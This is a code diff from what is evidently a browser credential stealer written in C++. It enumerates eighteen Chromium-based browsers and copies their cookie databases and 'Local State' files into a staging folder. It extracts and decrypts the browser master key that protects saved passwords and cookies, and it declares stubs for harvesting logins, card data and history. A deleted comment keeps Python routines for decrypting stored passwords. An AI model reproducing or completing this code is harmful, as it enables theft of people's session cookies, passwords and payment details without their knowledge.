@@ -28,48 +28,53 @@
 #include <fstream>
 #include <vector>
 #include "../../dependencies/sqlite/sqlite3.h"
-//#pragma comment(lib, "sqlite3.lib")
+#include "../../dependencies/Base64.h"
+#include "../../dependencies/json.hpp"
+#include "../../dependencies/binaryhandler.hpp"
+
 
 namespace global 
 {
     std::string user = func::GetUser();
     std::string appdata = "C:/Users/" + user + "/AppData/Local";
     std::string roaming = "C:/Users/" + user + "/AppData/Roaming";
+    std::string defaultPath = "C:/Users/" + user + config::path + "/Browsers";
+
+    std::string names[] = {
+        "/Amigo",
+        "/Torch",
+        "/Kometa",
+        "/Orbitum",
+        "/CentBrowser",
+        "/7Star",
+        "/Sputnik",
+        "/Vivaldi",
+        "/Chrome SxS",
+        "/Chrome",
+        "/Epic Privacy Browser",
+        "/Edge",
+        "/Uran",
+        "/YandexBrowser",
+        "/Brave-Browser",
+        "/Iridium",
+        "/Opera GX",
+        "/Opera"
+    };
 }
 
-int GetCookies(std::string path , std::string profile);
+int GetCookies(std::string path , std::string profile, int counter);
 
-void GetHistory(std::string path, std::string profile);
+void GetHistory(std::string path, std::string profile, int counter);
 
-void GetLogins(std::string path, std::string profile);
+void GetLogins(std::string path, std::string profile, int counter);
 
-void GetCards(std::string path, std::string profile);
+void GetCards(std::string path, std::string profile, int counter);
 
+void CopyMasterKey(std::string path, int counter);
 
 void browsers::Chromium()
 {
     printf("Chromium\n");
-
-    std::string names[] = {
-            "Amigo",
-            "Torch",
-            "Kometa",
-            "Orbitum",
-            "CentBrowser",
-            "7Star",
-            "Sputnik",
-            "Vivaldi",
-            "Chrome SxS",
-            "Chrome",
-            "Epic Privacy Browser",
-            "Edge",
-            "Uran",
-            "YandexBrowser",
-            "Brave-Browser",
-            "Iridium",
-            "Opera GX",
-            "Opera"
-    };
 
 
     std::string browsersPaths[] = 
@@ -104,6 +109,8 @@ void browsers::Chromium()
         "Guest Profile"
     };
 
+    int result = _mkdir(global::defaultPath.c_str());
+
     for (size_t i = 0; i < std::size(browsersPaths); i++)
     {
         if (std::filesystem::exists(browsersPaths[i])) 
@@ -112,57 +119,15 @@ void browsers::Chromium()
             {
                 if (std::filesystem::exists(browsersPaths[i] + "/" + profiles[j]))
                 {
-                    GetCookies (browsersPaths[i], profiles[j]);
+                    std::string dir = global::defaultPath + global::names[i];
+                    int result = _mkdir(dir.c_str());
+
+                    CopyMasterKey(browsersPaths[i], i);
+
+                    GetCookies (browsersPaths[i], profiles[j], i);
                 }
             }
         }
-    }
-}
-
-/*
-    def decrypt_password(self,buff, master_key):
-        try:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = self.generate_cipher(master_key, iv)
-            decrypted_pass = self.decrypt_payload(cipher, payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
-            return decrypted_pass
-        except:
-            return "Chrome < 80"
-
-    def decrypt_payload(self,cipher, payload):
-        try:
-            return cipher.decrypt(payload)
-        except:
-            pass
-
-
-    def generate_cipher(self,aes_key, iv):
-        try:
-            return AES.new(aes_key, AES.MODE_GCM, iv)
-        except:
-            pass
-*/
-
-
-void GetMasterKey(std::string path) 
-{
-    path += "/Local State";
-
-    func::copyFile(path, global::appdata+"/Temp");
-
-    path = global::appdata + "/Temp/Local State";
-
-    sqlite3* sql_browser_db = NULL;
-
-    status = sqlite3_open_v2(path,
-        &sql_browser_db,
-        SQLITE_OPEN_READONLY,
-        NULL);
-    if (status != SQLITE_OK) {
-        sqlite3_close(sql_browser_db);
-        DeleteFile(TEXT(path));
     }
 }
 
@@ -172,11 +137,42 @@ void browsers::FireFox()
 
 }
 
+std::string master_k(std::string path) {
+    path += "/Local State";
+    std::string content;
+    try {
+        nk125::binary_file_handler b;
+        content = b.read_file(path);
+        auto v = nlohmann::json::parse(content);
+        content = v["os_crypt"]["encrypted_key"];
+    }
+    catch (...) { return ""; }
 
-int GetCookies(std::string path, std::string profile)
+#ifdef DEBUG_MOD
+    std::cout << "Encrypted Master key: " << content << "\n";
+#endif
+
+    std::string master;
+    macaron::Base64::Decode(content, master);
+    master = decrypt_c32(master.substr(5, master.size() - 5));
+
+    return master;
+}
+
+void CopyMasterKey(std::string path, int counter)
+{
+    path += "/Local State";
+
+    func::copyFile(path, global::defaultPath + global::names[counter]);
+}
+
+
+int GetCookies(std::string path, std::string profile, int counter)
 {
     // Path to Chrome's cookies database
     std::string cookiesDbPath = path + "/" + profile+ "/Network/Cookies";
+
+    func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter]+ "/Cookies_" + profile);
 
     // Open the cookies database
     sqlite3* db;
@@ -236,17 +232,17 @@ int GetCookies(std::string path, std::string profile)
     return 0;
 }
 
-void GetHistory(std::string path, std::string profile)
+void GetHistory(std::string path, std::string profile, int counter)
 {
 
 }
 
-void GetLogins(std::string path, std::string profile)
+void GetLogins(std::string path, std::string profile, int counter)
 {
 
 }
 
-void GetCards(std::string path, std::string profile)
+void GetCards(std::string path, std::string profile, int counter)
 {
 
 }
